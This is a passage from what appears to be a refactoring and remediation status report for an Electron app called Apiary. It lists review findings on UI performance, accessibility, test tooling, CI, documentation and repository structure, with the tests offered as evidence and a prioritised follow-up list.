  `useNotificationItems()`; `LayoutContext` is split into a stable `LayoutActions` context and a
  `LayoutState` context. Measured with `tests/component/contextStability.test.tsx`: 6 distinct action
  identities for 5 toasts before, 1 after.
- **UI-6 — Fixed.** Both resize drags write the live value to a CSS custom property on `mousemove`
  and commit to React state once, on `mouseup`. The initial debounced `saveUiState` for every other
  `ui` write was reverted to a synchronous save per change after it was found to lose the last change
  on a real quit (no React unmount fires) — 12 relaunch-persistence e2e tests caught it; a drag still
  commits once, on mouseup. Proven by `tests/component/dragResizeCost.test.tsx` and the relaunch e2e
  specs.
- **UI-7 — Fixed.** `useHoverCard` no longer schedules a settle timer per mounted row on every
  scroll; one shared debounce finds what's under the pointer once scrolling stops. Measured: 40
  `getBoundingClientRect` reads on 40 rows before, 0 after (`tests/component/hoverCardScroll.test.tsx`).
- **UI-8 — Fixed.** Segment splitting, tool-summary extraction and the transcript's visible-message
  filter are memoised; `mergeLatestPage` moved to `state/transcriptMerge.ts` with its own tests.
  Measured: 2 re-summarise calls for two unrelated toggle clicks before, 0 after.
- **UI-9 — Rejected.** Measured `content-visibility: auto` on sidebar rows: mount time for 2,000
  sessions dropped from ~410ms to ~352ms, a real but partial win, but it broke
  `tests/e2e/nestedReorder.spec.ts` — `content-visibility: auto` empties `innerText` for skipped rows
  (documented browser behaviour), which a Playwright helper there reads. Reverted rather than ship a
  regression; recorded in CLAUDE.md for a future attempt that reads via `textContent` instead.
- **UI-10 — Fixed.** `state/ptyBus.ts` and `state/mrStatusStore.ts` give pty data/exit and
  merge-request status lookups one shared subscription each, instead of one per mounted component.
  Proven by `tests/component/{ptyBus,mrStatusStore}.test.tsx`.
- **UI-11 — Fixed.** `useAllWorktrees` depends on a signature of the tree's top-level folder paths,
  not the tree's identity, so a `treeChanged` that adds no folder no longer re-lists every folder's
  worktrees. Measured: 7 `listWorktrees` calls for 5 unrelated broadcasts before, 0 after.
- **UI-12 — Fixed.** `Composer` in `SessionColumn.tsx` is now keyed by `sessionId`, so it no longer
  stays mounted across a tab switch and leaks a draft, attachment or model choice into the newly
  active session. Proven by `tests/component/composer.test.tsx`'s draft-isolation case, which fails
  on the unkeyed version.
- **UI-13 — Fixed.** `src/renderer/ui/useEscape.ts` (a LIFO layer stack) replaced 9 hand-written
  Escape listeners across ContextMenu, GitMenu, LayoutPicker, BranchSwitcher, NoteDialog,
  SettingsDialog, ImportDialog and ImageLightbox, so a popup opened from within a dialog no longer
  also closes the dialog behind it. Proven by `tests/unit/useEscape.test.ts` and the pre-existing
  Escape tests across those components.
- **UI-14 — Fixed.** `loadGitStatus` and `usePluginBar`'s load/refresh now drop a response whose
  request key no longer matches the tab in front, closing the race where a slower fetch for a
  since-abandoned tab could overwrite the toolbar for the tab now showing. Proven by a new race test
  in `gitToolbar.test.tsx`.
- **UI-15 — Fixed.** Restoring sessions once is now latched with a `useRef` instead of relying on
  "no StrictMode double-invoke"; the restored-selection reason text was added; BranchSwitcher's
  ref-list fetch now remounts on `shellKey` with an honest dependency list. The two remaining items
  (`TerminalListPanel`, `ThemeEffects`) were re-checked and found already correctly justified — no
  change needed.
- **UI-16 — Fixed.** `checkout`/`checkoutRemote`/`checkoutDetached`/`mergeRef`/`createBranch` share
  one `run` helper for busy/error state instead of five copies of the same try/catch, show a clean
  message via `describeError` instead of Electron's raw `Error invoking remote method` text, and
  report a failure once instead of twice. A related regression (git's own progress chatter, e.g.
  "Auto-merging README.md", headlining ahead of the actual `CONFLICT` line) was found and fixed in
  `src/renderer/errors.ts`, which now headlines the first `CONFLICT`/`fatal:`/`error:` line. Proven
  by a new `gitToolbar.test.tsx` case and `tests/unit/describeError.test.ts`.
- **UI-17 — Partly done.** Covered by MAIN-21 above: pty ids are minted/parsed through one shared
  module now; the branded-type consolidation that would remove the remaining `(key, isPtyId)` pairs
  from `ApiaryApi` is unblocked (MAIN-11 is done) but not yet attempted.
- **UI-18 — Partly done.** Dead code removed (`state/useDebouncedValue.ts`, a vestigial alias in
  `useTree.ts`); stale `pruneColumns` comments fixed to `tidyLayout`; `relativeTime`/`fullTime` moved
  out of a component file into `ui/format.ts`; per-window URL parsing moved to `state/windowParams.ts`.
  Consolidating the 11 tree-walking functions spread across App/Sidebar/SessionTree/PaneFiller into
  one `shared/treeWalk.ts` was left for a follow-up — real duplication, but each walker already has
  its own callers and tests, and this is a low-severity finding.
- **UI-19 — Partly done.** `ui/icons/ChevronIcon.tsx` and `features/sidebar/SectionHeader.tsx` were
  extracted as pure, prop-count-neutral moves. Splitting the rest of Sidebar.tsx (955 lines) into
  sections and hooks is deferred with UI-1: App still passes Sidebar 36 raw props that the split's
  hooks exist to replace, so cutting the file now would thread the same 36 props through a new
  boundary rather than reduce them.
- **UI-20 — Fixed.** `SettingsDialog.tsx`'s 875-line ternary chain is now `features/settings/`: a
  `SECTIONS` registry, shared field components (`CheckboxSetting`, `NumberSetting`), and one section
  component per tab. This also surfaced and fixed a real bug: Settings opened a second subscription
  to the updater, so a push while Settings was open was handled twice; it now takes `update` as a
  prop from App. Proven by `tests/component/update.test.tsx` counting `updateStatus()` calls
  (2 before, 1 after).
- **UI-21 — Partly done.** `PaneDropOverlay.tsx` was extracted out of `SessionColumn.tsx` as a pure
  move, verified against `paneLayouts`/`sessionTabs`/`multiTerminal` component tests. The rest
  (SessionHeader, SessionBody, ShellPane, `useShellTerminals`, `useGitStatus`, `useGitActions`) is
  deferred with UI-1, per the review's own "prefers UI-2 wired into App first".
- **UI-22 — Partly done.** Fixed a real duplication bug: `useThemeState` opened its own
  `onThemeChanged` subscription per call site, so a broadcast applied twice (double custom-property
  reset, double `THEME_CHANGE_EVENT`) whenever Settings' ThemesSection was open alongside App.
  Replaced with `theme/themeStore.ts`, a single `useSyncExternalStore`-backed subscription. Proven by
  a `themes.test.tsx` case counting dispatches (2 before, 1 after). Splitting `ThemesSection.tsx`
  into smaller components was not done — cosmetic next to the bug fix.
- **UI-23 — Fixed.** `ui/fireAndForget.ts` (the renderer's counterpart to main's) routes background
  failures to the diagnostic log instead of an unhandled rejection, applied across UpdateBanner,
  SessionRow's VS Code probe, TranscriptImage, ImportDialog/SettingsDialog's initial loads (now
  reporting the failure instead of an empty list or indefinite "Loading…"), and — once App.tsx's
  props were stabilised by UI-1 — the App.tsx call sites the finding named directly
  (`themeGpuCompositing`, the tree-then-pending/rekey chains, `onResume`). Proven by
  `tests/component/update.test.tsx` and existing suites.
- **UI-24 — Fixed.** Sidebar and every App-level dialog (DeleteSessionDialog, ConflictDialog,
  MoveSessionDialog, WorktreeConflictDialog, NoteDialog, ImportDialog, SettingsDialog) now wrap their
  own render output in `<ErrorBoundary>`, so a render error in one no longer blanks the whole window.
  Proven by an `errorReporting.test.tsx` case that forces a real removal inside the sidebar's subtree
  and confirms an open transcript beside it is untouched. The per-pane boundary's `resetKey` was left
  as a documented, separate gap.
- **UI-25 — Fixed.** `src/renderer/ui/Modal.tsx` (focus trap, Escape via the UI-13 stack, named via
  `aria-labelledby`, restores focus on close) now drives all 8 dialogs the finding named:
  Delete/Conflict/Move/WorktreeConflict (previously no Escape at all) and Note/Import/Settings/
  BranchSwitcher. Fixed a real race this surfaced: a synchronous focus restore in BranchSwitcher
  could synthesize a click that reopened a dialog just closed by Enter; restore now happens one
  animation frame later. Proven by `tests/component/modal.test.tsx` and `gitToolbar.test.tsx`.
- **UI-26 — Fixed.** `src/renderer/ui/Menu.tsx` gives ContextMenu and GitMenu real keyboard
  navigation (arrows, Home/End, submenu entry/exit) and correct roles; `HoverCard` changed from
  `role="tooltip"` (which promises non-interactive behaviour it can't honour) to
  `role="dialog" aria-modal="false"`, reachable by Tab; BranchSwitcher gained the arrow navigation it
  already claimed to have. The session tab strip is now a real WAI-ARIA tablist
  (`role="tablist"`/`"tab"`, roving tabindex, Left/Right/Home/End, Delete-to-close,
  `aria-controls`/`role="tabpanel"`). Proven by new cases in `contextMenu.test.tsx`,
  `gitMenu.test.tsx`, `sidebarPopups.test.tsx`, `gitToolbar.test.tsx` and 4 new `sessionTabs.test.tsx`
  cases.
- **UI-27 — Fixed.** The sidebar's grid dividers and both pane resizers are now `role="separator"`,
  reachable by Tab, steppable by arrow keys. The whole folder/session hierarchy is one `role="tree"`
  with `treeitem` rows, `aria-level`/`expanded`/`selected`, and one Tab stop for the entire tree
  (was ~2,500 for 500 sessions) — Up/Down/Left/Right/Home/End navigate it, Enter opens/toggles,
  Shift+Enter splits, Shift+F10 opens the row's context menu. Pinned/Recent/Active/search-results
  stay their own flat trees on purpose (different data models, not a folder hierarchy). Proven by
  `tests/component/sidebarTree.test.tsx` (10 cases).
- **UI-28 — Fixed.** `LayoutPicker` takes a `focusOnOpen` flag (true only for a real click) so
  hovering a tab's arrange/split button to preview layouts no longer steals keyboard focus from the
  composer or terminal underneath. Proven by two new `paneLayouts.test.tsx` cases.
- **UI-29 — Fixed.** Every looping animation (icon-button/toolbar-button/spinner-dot spinners, the
  notification entrance) now has its own `prefers-reduced-motion` rule; the "running" status dot
  gets a static inset ring under reduced motion so colour isn't the only thing distinguishing it from
  "idle" (WCAG 1.4.1). `<html lang="en">` was added. Proven by three new `uiPolish.test.tsx` cases
  using Playwright's `emulateMedia`.
- **UI-30 — Partly done.** `src/renderer/styles.css` is now 12 ordered `@import`s under `styles/`, a
  verified byte-identical pure move; a full z-index scale (13 tokens) replaces all 17 literal
  `z-index` values, and the last 4 literal colours were tokenised. Consolidating the control-layer
  selectors onto `.btn` (about 10 dialogs' worth of buttons) and re-enabling
  `no-descending-specificity` are deferred — they need `.tsx` edits that would have collided with
  the concurrent feature-folder restructuring (UI-31/STRUCT-2/3).
- **UI-31 — Fixed.** `src/renderer/components/` (43 files) and the leftover `state/` modules are now
  under `app/`, `features/{sidebar,pane,transcript,terminal,git,layout,update,dialogs}/` and `ui/`,
  superseding STRUCT-3. Proven by `npm run test:component` (250/250) and `npm run test:e2e:smoke`
  (12/12) after the move.
- **UI-32 — Fixed.** The four spots where a disclosure chevron duplicated `ui/icons/ChevronIcon.tsx`
  now reuse it; ContextMenu's check mark reuses `CheckIcon` via a new `on` prop.
  EditableSessionTitle's pencil and SessionTree's plus keep their own paths deliberately — their
  strokes visibly differ from the shared icons, and reusing them would be an unrequested visual
  change.
- **UI-33 — Rejected.** Measured with `tests/e2e/bench/themePerf.spec.ts`: typing in the terminal
  shows input p95 40ms, 0 inputs over 100ms, 0 frames over 50ms — well inside the bench's own
  regression thresholds. The DOM xterm renderer is not on the critical path for typing, so a WebGL
  addon isn't warranted.

### Part D: Testability, test harness, tooling and CI

- **TEST-1 — Fixed.** Measured first: under a fresh `npm ci` with no rebuild, `better-sqlite3` 13 and
  `node-pty` 1.1 both load correctly under plain Node and under Electron — both ship prebuilt N-API
  binaries, which are ABI-stable across runtimes, so the trap is gone entirely rather than patched.
  The `rebuild:electron`/`rebuild:node` calls were removed from every npm script that doesn't need
  them; both scripts remain as manual escape hatches. CLAUDE.md's ABI-trap section now describes the
  measurement, not machinery that isn't needed.
- **TEST-2 — Fixed.** `vitest.config.ts` defines `unit` (parallel, native-free) and `integration`
  (serial) projects; `tests/unit/purity.test.ts` fails if a unit test imports a native module or a
  real-subprocess dependency. `.husky/pre-push` runs `npm run test:unit`. Measured: 609 unit tests
  run in ~1.5–2.3s.
- **TEST-3 — Fixed.** `@vitest/coverage-v8` is wired into both Vitest configs (`test:coverage`,
  `test:component:coverage`); no thresholds yet, per the review's own phase-1 scope.
- **TEST-4 — Fixed.** `mergeSettingsPayload(current, next, knownPluginIds)` in `src/main/settings.ts`
  is unit-tested directly; `tests/integration/ipcWiring.test.ts` mocks `electron` so every channel
  the preload invokes is checked against a registered handler — verified as a real check by
  temporarily removing a handler registration and confirming the test names the missing channel.
  Collapsing `registerIpc`'s parameters into one `IpcDeps` object, initially left undone here, was
  completed as part of MAIN-13's registrar split.
- **TEST-5 — Partly done.** Fixed 5 of the 6 drifts the review's evidence table named in
  `tests/component/fakeApiary.ts` (event names, trimming, settings merge semantics, a shared
  `DEFAULT_SETTINGS` source with `src/main/settings.ts`); the transcript page-size drift (fake pages
  at 50, real default 200) was left, since fixing it needs a paired change to a test that
  deliberately pins the fake's current page size. The actual ask — one behavioural spec run against
  both `fakeApiary` and a real-main loopback, so drift fails CI on its own — is deferred; the
  loopback bridge TEST-4 built is the piece it needs, but the spec itself is a separate, larger
  effort.
- **TEST-6 — Fixed.** `AppServiceOptions.deps?: { pty?, store?, plugins? }` lets a test inject an
  already-built dependency instead of `AppService` always constructing its own — the seam MAIN-14's
  extractions used throughout. Proven by `tests/integration/appServiceDeps.test.ts`.
- **TEST-7 — Partly done.** `tests/integration/searchWorker.test.ts` exercises the real search
  worker thread (previously only the in-process fallback was tested) by bundling it with esbuild and
  pointing a `SearchClient` at it. A packaged-app Playwright smoke project was not built — real new
  e2e infrastructure — but the packaged `.app` built for TEST-18's measurement was manually
  boot-and-quit checked with `codesign --verify --deep --strict`.
- **TEST-8 — Fixed.** `Harness` now carries `env`/`electronArgs` so `launchAgainst` rebuilds a
  relaunch's environment from what the original launch used, instead of a hard-coded 4-variable
  subset that silently dropped test hooks like `APIARY_CODE_PATH`/`APIARY_GLAB_PATH`.
- **TEST-9 — Partly done.** Every Electron launch now sets `GIT_CONFIG_GLOBAL` (isolated identity,
  gpgsign off) and `GIT_CONFIG_NOSYSTEM=1`, and `launchApiary` seeds a `claudeBin` stand-in by
  default, replacing three separate copies of the same setup and covering two specs that previously
  had none at all. A couple of small redundant items (per-call `-c commit.gpgsign=false` in test
  files' own git calls, a Vitest `globalSetup` for unit/integration) were left for whoever next
  touches those configs.
- **TEST-10 — Fixed.** `playwright.config.ts` sets `retries: 1`/`forbidOnly` on CI and a
  list/html/junit reporter; `helpers.ts` starts a trace on every launch and saves it plus a
  screenshot only when the owning test failed.
- **TEST-11 — Fixed.** A new `e2e-smoke` CI job runs `xvfb-run -a npm run test:e2e:smoke` on
  `ubuntu-24.04`. Verified locally (macOS): all 12 `@smoke` tests pass in ~30s; the first real Linux
  CI run is the outstanding verification, since GitHub Actions Linux runners weren't available to
  this branch's agents.
- **TEST-12 — Partly done.** `concurrency`, `timeout-minutes`, SHA pinning, a Playwright-browser
  cache and `.github/dependabot.yml` are all in place; `.nvmrc` (left out of this item deliberately
  to avoid a merge collision) was added separately under DOC-9. A junit reporter/upload for Vitest
  itself is still missing.
- **TEST-13 — Fixed.** `release.yml` is now `verify` → `build` (matrix, `needs: verify`) → `publish`
  (`needs: build`, only runs if every build leg succeeded), with `fail-fast` defaulting to true, so a
  failing platform can no longer ship a partial release. The macOS leg now also runs `npm test`.
- **TEST-14 — Partly done.** `tests/component/setup.ts` now fails a test on any unexpected
  `console.error` or window `error`/`unhandledrejection`, which immediately surfaced 37 tests'
  worth of a previously-invisible xterm `TypeError`. Reproduced its actual cause — xterm's own
  internal `Viewport` `ResizeObserver` reading dimensions off an already-disposed renderer, not
  `TerminalView`'s own code as the finding guessed — and confirmed a teardown-ordering fix doesn't
  eliminate it. That one signature stays allowlisted by message, with the measurement recorded in a
  comment, pending the xterm 5→6 upgrade; every other console/window error now fails its test.
- **TEST-15 — Partly done.** `noImplicitReturns`, `noFallthroughCasesInSwitch`,
  `useUnknownInCatchVariables` and `noImplicitOverride` are on in both tsconfigs (0–3 errors each,
  fixed). `exactOptionalPropertyTypes` (~24 sites) and `noUncheckedIndexedAccess` (89 src, 418 test
  sites) were measured and left out, per this task's own instruction to skip
  `noUncheckedIndexedAccess` unless trivial.
- **TEST-16 — Fixed.** `@typescript-eslint/switch-exhaustiveness-check` (caught and fixed one real
  gap in `UpdateBanner.tsx`), `prefer-nullish-coalescing`, and `no-deprecated` (with a 42-file codemod
  off the deprecated global `JSX` namespace) are all in `npm run lint`; `madge` runs as
  `lint:cycles`, still zero circular imports.
- **TEST-17 — Partly done.** Electron 38→44, electron-builder→26, Vitest 2.1→5, `@vitest/browser` +
  the new `@vitest/browser-playwright` provider, electron-vite 2→5 with Vite 7.3.6 pinned, and
  `@vitejs/plugin-react`→5 are all done (steps 2–4 of the review's own ordering), including fixing
  what each bump broke (jest-dom's `toHaveTextContent` semantics change, two test helpers that raced
  an async fetch, an Electron 44 propagation-timing change, a scrollbar-button hit-test change).
  React 19, xterm 6, TypeScript 7, marked 18 and chokidar 5 are explicitly out of scope for this
  cycle. A post-merge tsconfig fix (`types` still named `@vitest/browser/providers/playwright`,
  corrected to `@vitest/browser-playwright`) is included. Proven by `npm run test:component`
  (250/250), `npm run test:e2e` (143/143 non-skipped), `npm run typecheck`, `npm run lint`.
- **TEST-18 — Fixed.** `react`, `react-dom`, `marked`, `dompurify` and the four `@xterm/*` packages
  moved from `dependencies` to `devDependencies` (verified zero runtime `require`/`import` from
  main/preload); `electron-builder.yml` excludes node-pty's and better-sqlite3's build-time-only
  files. Measured with `npm run dist:mac:arm64`: `Apiary.app` 332M → 309M (-7%), `app.asar` 15M →
  5.2M. `codesign --verify --deep --strict` passed on the trimmed build.
- **TEST-19 — Partly done.** `tests/integration/appService.test.ts` (1,435 lines) is split into
  `tests/integration/appService/<topic>.test.ts` sharing a `setup.ts` fixture, with byte-identical
  test bodies and an unchanged test count (1,139 before and after). Deduplicating the git-repo-builder
  fixtures across `branchOps.test.ts` and several e2e specs, and the shared-fixture literals, was
  left — both depend on TEST-9/TEST-5, neither of which is fully closed out, and it's a
  low-severity, wide-touching change.

### Part E: Documentation, shared layer and repository structure

- **DOC-1 — Fixed.** Root `CLAUDE.md` cut from 627 to 230 lines; subsystem "why" content moved,
  near-verbatim, to nested `CLAUDE.md` files (`src/main/{,pty,search,store,update,plugins,log}/
  CLAUDE.md`, `src/renderer/{,state}/CLAUDE.md`, `src/shared/theme/CLAUDE.md`, `tests/CLAUDE.md`) and
  `docs/architecture/*.md`/`docs/{testing,debugging,environment,packaging}.md`. No prose was deleted.
- **DOC-2 — Fixed.** Stale statements corrected (rule count, CI job list, "bumped per release" →
  "for every change", linter count), plus stale code comments in `App.tsx`/`useTree.ts`/
  `terminalService.ts` that referred to removed code.
- **DOC-3 — Fixed.** Root "Commands" table and a "Single test per layer" block, including the
  Playwright `serial`-depends-on-`parallel` caveat and the actual fast single-spec e2e command.
- **DOC-4 — Fixed.** Root "How to add…" with 8 recipes (IPC call, setting, plugin, theme token,
  theme effect, log line, component test, e2e spec), written against the current
  `shared/ipc/contract.ts`/`main/ipc/handlers/*` layout.
- **DOC-5 — Fixed.** Root "Definition of done" and "Versioning, changelog, commits" sections, plus a
  fuller version in `CONTRIBUTING.md`; corrected the finding's own commitlint header-length figure to
  the actual 150.
- **DOC-6 — Fixed.** `docs/environment.md` documents every `APIARY_*`/`CLAUDE_CONFIG_DIR`/
  `APIARY_SAFE_THEME` variable and the on-disk `userData` file list.
- **DOC-7 — Fixed.** A 13-row feature-to-path table in root CLAUDE.md, built from the current tree.
- **DOC-8 — Fixed.** `docs/superpowers/README.md` indexes that folder in place (matches how the
  maintainer's tooling writes new plans there) rather than moving it; `docs/test-suite-proposal.md`
  moved to `docs/history/` with its own index.
- **DOC-9 — Fixed.** Added `LICENSE` (MIT), `.nvmrc` (22), `CONTRIBUTING.md`; moved the README's
  ~90-line packaging section to `docs/packaging.md` and fixed its stale example path.
- **DOC-10 — Fixed.** 10 ADRs in `docs/adr/` (plus a template) for decisions with an actual
  tried-and-rejected alternative: the trust-boundary rules, no-`backdrop-filter`, search-in-a-worker,
  glab-not-API, and others.
- **DOC-11 — Fixed.** `scripts/check-doc-refs.mjs` extracts backticked path-like tokens from every
  `CLAUDE.md`/`docs/architecture/**`/`CONTRIBUTING.md` and fails on any that no longer resolve;
  wired into `npm run lint:md`, so `npm run lint` and CI both run it. Verified by renaming a real
  file locally and confirming the check fails, then restoring it; caught three genuine pre-existing
  path inaccuracies while being written.
- **SHARED-1 — Fixed.** `src/shared/api.ts`/`types.ts` split into `shared/domain/{session,git,
  transcript,tabs,settings,log,update,plugins,pty}.ts` and `shared/theme/{state,models}.ts`, with
  `api.ts`/`types.ts` kept as re-export barrels rather than codemodding all 69 importers.
- **SHARED-2 — Fixed.** Covered under MAIN-22 above.
- **SHARED-3 — Fixed.** `TabView` was unified by the SHARED-1 split; `BUILTIN_THEME_PREFIX`
  (`shared/theme/builtins.ts`) replaced `'builtin:'` string literals; a `LogScope` union types
  `ApiaryApi.logWrite`'s one renderer-controlled entry point (main's ~30 internal log call sites
  were left as plain strings — retyping them was judged not worth the diff for a low-severity
  finding); pty ids are named per MAIN-21 above.
- **SHARED-4 — Fixed.** `EFFECT_NOTES`/`FONT_NOTES` in `shared/theme/prompt.ts` are now
  `Record<EffectKind, string>`/`Record<UiFont | MonoFont, string>`, so a new effect/font fails
  typecheck until it has a note.
- **SHARED-5 — Fixed.** `no-restricted-imports`/`no-restricted-globals` added for `node:*`/
  `process`/`Buffer`/`window`/`document`/`require`/`__dirname` in the shared ESLint block; the
  `Window` augmentation moved from `shared/api.ts` to `src/renderer/env.d.ts`.
- **SHARED-6 — Fixed.** Removed the dead `TreeNode` export (zero references).
- **SHARED-7 — Fixed.** `isShellList` extracted and reused in `isTabTransfer`/`isPersistedTab`;
  `PersistedTab` is now `Omit<TabTransfer, 'ptyId'>`; the URL validator (`clampSegments`) gained its
  own test cases.
- **SHARED-8 — Fixed.** `theme/readability.ts` split out of `validate.ts`; `shared/promptPath.ts`
  renamed to `promptPreview.ts` so it's no longer confusable with `main/pty/promptPath.ts`.
- **STRUCT-1 — Fixed.** Test-only fake binaries moved from `scripts/fixtures/` to
  `tests/fixtures/bin/`; the screenshot-only fake moved beside `scripts/screenshot/`.
- **STRUCT-2 — Fixed.** `src/main`'s remaining flat files grouped into `app/`, `claude/`,
  `windows/`, `ipc/` per the review's own reconciled §3.2 tree; `appService.ts`/`index.ts`/
  `settings.ts` stay at the top level as the composition root, as the review itself recommends.
  Proven by `madge --circular` (still clean) and the `@smoke` e2e run.
- **STRUCT-3 — Fixed.** Superseded by UI-31 above, per the review's own note that they overlap.
- **STRUCT-4 — Fixed.** Six mismatched unit-test files renamed to match their module; every
  `tests/unit`/`tests/integration` import of `src/shared` now uses the `@shared/*` alias (31 files).
- **STRUCT-5 — Partly done.** `.gitignore` and ESLint's ignore list were reconciled
  (`.superpowers/`, `.claude/settings.local.json`, `.vscode/`). Adding `@eslint/compat`'s
  `includeIgnoreFile` so ESLint reads `.gitignore` directly was not done — a new dependency for a
  low-severity tidy-up where the two lists were already hand-kept in sync.

### Follow-up work

In priority order:

1. **UI-1 steps 3–6** (wire the `workspaceReducer` into `App.tsx` via a provider, extract the
   pending/reconcile/pty-lifecycle effects into hooks, add `DialogHost`) — and what cascades from it:
   **UI-2**'s reducer swap, **UI-4**'s remaining memoisation, **UI-19**'s Sidebar split, **UI-21**'s
   SessionColumn split. Needs one change per hook with full e2e verification after each, per the
   review's own plan — three agents independently judged a piecemeal attempt too risky given this
   codebase's history of rekey/spawn-over-live-id bugs.
2. **MAIN-14 steps 5–6** (split `SessionCatalog`/`SessionActions` out of `AppService`) and
   **MAIN-15 step 5** (`createContainer`, which depends on it) — the refresh reentrancy state
   machine and the `live` map need a design pass before splitting, given their history of races.
3. **TEST-5**'s full contract suite (fake vs. real-main loopback, so drift fails CI on its own) and
   **TEST-19**'s fixture deduplication.
4. **UI-30**'s control-layer consolidation onto `.btn` and re-enabling `no-descending-specificity`.
5. **MAIN-17**'s generic `remoteUrl()`/ref-resolution seam and **MAIN-21**/**UI-17**'s branded
   `SessionId`/`PtyId` types — both worth doing once, respectively, a second plugin exists or
   someone is touching the terminal-ref call sites anyway.
6. **MAIN-26 step 2** (send pty output only to windows with that pty attached) — only if a future
   measurement shows the per-tick coalescing from step 1 isn't enough.
7. **SEC-5**'s Ed25519 update-feed signing and **SEC-13**'s entitlements — both need the maintainer
   to set up code signing first.
8. **TEST-7**'s packaged-app Playwright smoke project and **TEST-14**'s xterm `ResizeObserver`
   allowlist entry — the latter is expected to resolve itself once **TEST-17**'s deferred xterm 6
   upgrade lands.
9. **TEST-17**'s remaining majors: React 19, xterm 6, TypeScript 7, marked 18, chokidar 5.

### Follow-up status (1.28.0)

1. **Done.** The `workspaceReducer` runs `App.tsx` through `features/workspace/WorkspaceProvider.tsx`;
   the pending, follow/rekey, pty-lifecycle, launch-restore, layout-reporting and tab-transfer
   effects are named hooks beside it; dialogs live in `features/dialogs/DialogHost.tsx`, opened
   through `useDialogActions()`; `useResizeDrag` and `PaneGrid` (UI-1 step 6). Sidebar and
   SessionColumn are split into sections and hooks and memoised (UI-19, UI-21, UI-4), with
   `appPropStability.test.tsx` as the evidence. `App.tsx` is 807 lines, not the ~250 aimed for:
   what remains is the Sidebar/SessionColumn wiring and resume/conflict handling.
2. **Done.** `sessions/sessionCatalog.ts` (owns `live` and the refresh state machine, with the design
   note at its top) and `sessions/sessionActions.ts`; `app/container.ts`'s `createContainer`.
   `AppService` keeps thin delegates, so the IPC handlers and integration tests did not move.
3. **Done.** `tests/contract/bridgeContract.ts` runs against the fake (component project) and the
   real preload + `registerIpc` (integration project); it found and fixed two fake-side drifts
   (transcript page size, `removeSession` un-importing). Git and session fixtures are in
   `tests/fixtures/`; the ~60 test files still using session-title literals were left as they are.
4. **Done.** Buttons go through `.btn`; `no-descending-specificity` is on, with no disables.
5. **Done.** `PluginContext.remoteUrl()` (memoised per evaluation) and `plugins/remote.ts`'s
   `resolveRemote`; branded `SessionId`/`PtyId` in `shared/domain/ids.ts` and one `TerminalRef`
   replacing all 17 `(key, isPtyId)` pairs. Not done: MAIN-17's generic `pluginRefStatus` channel
   and per-plugin TTLs; tab keys stay `string` (a key is either kind of id).
6. **Done.** `windows/ptyAttachments.ts`: a window attaches the ptys its terminals show and gets
   only their `ptyData`; exit and session-list events are still broadcast.
7. **Not started** — still needs the maintainer's signing setup.
8. **Done.** `npm run test:packaged` (opt-in, not in CI; macOS only after `codesign --verify`).
   TEST-14's allowlist entry is gone with xterm 6.
9. **Done but for TypeScript 7.** React 19, xterm 6, marked 18, chokidar 5; TypeScript 6.0.
   TypeScript 7 ships no JS API and typescript-eslint's peer range stops below 6.1 — revisit when
   typescript-eslint supports it.
